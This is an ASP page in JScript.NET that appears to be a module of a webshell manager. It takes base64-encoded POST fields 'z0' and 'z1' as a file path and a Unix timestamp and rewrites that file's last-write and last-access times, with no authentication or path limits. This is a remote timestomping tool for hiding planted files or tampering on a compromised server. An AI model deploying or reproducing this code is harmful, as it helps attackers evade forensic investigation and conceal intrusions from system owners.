<%

function GetCurrentCharset() : String {
    var charset : String = Response.Charset;
    if (charset == null || charset == "") {
        charset = "utf-8";
    }
    return charset;
}

function Base64Decode(str : String) : String {
    if (str == null || str.trim() == "") {
        return "";
    }
    try {
        var bytes : Byte[] = Convert.FromBase64String(str);
        var enc : Encoding = Encoding.GetEncoding(GetCurrentCharset());
        return enc.GetString(bytes);
    } catch(e) {
        return "";
    }
}

function UnixTimestampToDateTime(timestamp : double) : DateTime {
    var origin : DateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
    return origin.AddSeconds(timestamp).ToLocalTime();
}

function Main() {
    var z0 : String = Request.Form["z0"];
    var z1 : String = Request.Form["z1"];

    if (z0 == null || z1 == null || z0.trim() == "" || z1.trim() == "") {
        return "0|Missing parameters.";
    }

    var filename : String = Base64Decode(z0);
    var timestampStr : String = Base64Decode(z1);
    var timestamp : double = 0;

    try {
        timestamp = Double.Parse(timestampStr);
    } catch(e) {
        return "0|Invalid timestamp format.";
    }

    if (!File.Exists(filename)) {
        return "0|File does not exist.";
    }

    try {
        var targetTime : DateTime = UnixTimestampToDateTime(timestamp);

        File.SetLastWriteTime(filename, targetTime);
        File.SetLastAccessTime(filename, targetTime);

        return "1|";
    } catch(e) {
        return "0|Failed to modify the timestamps. Error: " + e.message;
    }
}

Response.Write(Main());

%>